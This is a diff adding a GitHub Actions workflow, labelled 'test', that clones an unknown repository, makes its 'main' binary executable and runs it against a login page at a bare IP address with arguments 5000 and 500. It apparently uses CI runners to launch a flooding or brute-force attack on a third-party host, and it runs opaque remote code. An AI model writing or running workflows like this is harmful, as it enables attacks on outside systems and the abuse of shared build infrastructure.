@@ -1,0 +1,22 @@
+name: test
+
+on: [workflow_dispatch]
+
+jobs:
+  clone-and-run:
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Checkout current repository
+      uses: actions/checkout@v4
+
+    - name: Clone target repository
+      run: git clone https://github.com/sdasdsaddd33/gomi7.git ./target-repo
+
+    - name: Make main
+      run: chmod +x ./target-repo/main
+
+    - name: Runs
+      run: |
+        cd ./target-repo
+        ./main https://36.3.104.69/auth/login/ 5000 500
